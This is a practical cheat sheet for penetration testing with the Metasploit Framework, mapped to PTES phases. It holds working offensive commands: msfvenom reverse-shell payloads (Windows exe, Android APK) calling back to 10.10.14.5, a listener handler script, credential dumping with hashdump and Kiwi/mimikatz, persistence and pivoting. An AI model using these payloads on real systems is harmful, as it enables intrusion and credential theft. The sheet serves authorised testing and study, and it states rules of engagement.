# Penetration Testing With Metasploit Framework (MSF)

---

## Purpose

Short, practical reference for using MSF across a penetration test. Map inputs, levers, and outputs for each phase.

---

## PTES phases mapped to MSF

- **Recon / Enumeration**
    
    - Inputs: target IPs or ranges, Nmap scans, credentials lists.
        
    - Levers: auxiliary modules, nmap import, WMAP.
        
    - Outputs: host list, open ports, service versions, users.
        
- **Vulnerability Scanning**
    
    - Inputs: service versions, host list.
        
    - Levers: auxiliary vuln scanners, Nessus import, `search` for CVEs.
        
    - Outputs: vulnerable services and CVE references.
        
- **Exploitation**
    
    - Inputs: selected exploit module, payload choice, LHOST/LPORT.
        
    - Levers: exploit pairing, payload encoders, staged vs non-staged.
        
    - Outputs: sessions (meterpreter or shell).
        
- **Post-exploitation**
    
    - Inputs: active session, target OS info.
        
    - Levers: meterpreter extensions, post modules, pivoting (route/autoroute).
        
    - Outputs: creds, persistence, internal access.
        
- **Reporting / Cleanup**
    
    - Inputs: workspace data, msfdb artifacts.
        
    - Levers: export workspaces, clear persistence, remove artifacts.
        
    - Outputs: evidence, remediation notes.
        

---

## Quick workflow (practical)

1. Create workspace: `workspace -a client-name`
    
2. Import Nmap scan: run Nmap `nmap -sV -oX scan.xml target` then in msfconsole `db_import scan.xml`
    
3. Enumerate with auxiliary modules: `use auxiliary/scanner/*` then `set RHOSTS <range>` `run`
    
4. Search for exploits: `search type:exploit name:<service>`
    
5. Select exploit: `use exploit/<path>` then `show options`
    
6. Set variables: `set RHOSTS <ip>` `set LHOST <your-ip>` `set LPORT 4444`
    
7. Choose payload: `set PAYLOAD windows/meterpreter/reverse_tcp` or `set PAYLOAD linux/x86/meterpreter/reverse_tcp`
    
8. Run exploit: `exploit -j` (job) or `run`
    
9. Manage sessions: `sessions -l` `sessions -i <id>` then `background`
    
10. Post-exploit: `use post/windows/gather/*` or `meterpreter> run post/*` or use Kiwi (`load kiwi`)
    
11. Pivot: `route add <subnet> <netmask> <session>` and `use auxiliary/scanner/*` from routed host
    
12. Cleanup: remove files, clear logs if authorised, export evidence, `workspace -d` to delete workspace if needed
    

---

## Commands cheatsheet

- `msfconsole` - start console
    
- `db_status` - check msfdb connection
    
- `workspace -a <name>` - add workspace
    
- `workspace` - list/switch workspaces
    
- `search <term>` - find modules
    
- `use <module>` - load module
    
- `show options` - required variables
    
- `set <VAR> <value>` - set option
    
- `unset <VAR>` - unset
    
- `exploit` or `run` - execute module
    
- `exploit -j` - run in background as job
    
- `jobs` - list jobs
    
- `sessions` - list sessions
    
- `sessions -i <id>` - interact with session
    
- `resource <file.rc>` - run resource script
    
- `db_import <file.xml>` - import scan (Nmap/Nessus)
    
- `route add <net> <mask> <sid>` - add pivot route
    
- `creds` - list harvested credentials
    

---

## Generating payloads (msfvenom)

- Windows exe reverse shell:
    
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe`
        
- Meterpreter APK:
    
    - `msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -o app.apk`
        
- Encode: `-e x86/shikata_ga_nai -i 3` (use sparingly and test)
    

---

## Resource scripts

- Create `.rc` with repeated commands. Example:
    

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
exploit -j
```

- Load in msfconsole: `resource ./auto.rc`
    

---

## Importing external scans

- Nmap XML: `nmap -sV -oX scan.xml target` then `db_import scan.xml` in msfconsole
    
- Nessus: export Nessus XML and `db_import nessus_scan.nessus`
    
- WMAP: load WMAP plugin inside msfconsole for web scanning
    

---

## Auxiliary modules: examples

- `auxiliary/scanner/ssh/ssh_version`
    
- `auxiliary/scanner/smb/smb_version`
    
- `auxiliary/scanner/http/http_enum`
    
- `auxiliary/scanner/ftp/ftp_login`
    
- `auxiliary/scanner/smtp/smtp_enum`
    

---

## Post-exploitation highlights

- Use Meterpreter for interactive tasks: `sysinfo`, `getuid`, `ps`, `hashdump` (requires privileges)
    
- Load extensions: `load kiwi` then `creds_all` or run mimikatz actions via Kiwi
    
- Persist: `run persistence -h` or use post modules under `post/windows/manage` (only if authorized)
    
- Pivoting: `run autoroute -s <subnet>` or `route add`
    

---

## Rules of engagement and safety

- Only test systems you have explicit permission to test.
    
- Maintain logs of destructive actions.
    
- Do not run exploit modules that cause crashes unless allowed.
    
- Always have a recovery/backout plan.
    

---

## Quick templates

- **Nmap -> import -> scan**
    
    - `nmap -sV -p- -oX fullscan.xml target && msfconsole -q -x "db_import fullscan.xml; workspace -a target; jobs;"`
        
- **Start handler**
    
    - `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; exploit -j;"`
        

---

## Notes & links

- Keep msf updated. On Kali use `apt update && apt upgrade metasploit-framework`.
    
- Keep PostgreSQL running for full functionality: `systemctl start postgresql`.
    

---

## PTES mapping table

| Penetration Testing Phase           | Metasploit Framework Implementation    |
| ----------------------------------- | -------------------------------------- |
| Information Gathering & Enumeration | Auxiliary Modules                      |
| Vulnerability Scanning              | Auxiliary Modules, Nessus              |
| Exploitation                        | Exploit Modules & Payloads             |
| Post Exploitation                   | Meterpreter                            |
| Privilege Escalation                | Post Exploitation Modules, Meterpreter |
| Maintaining Persistent Access       | Post Exploitation Modules, Persistence |
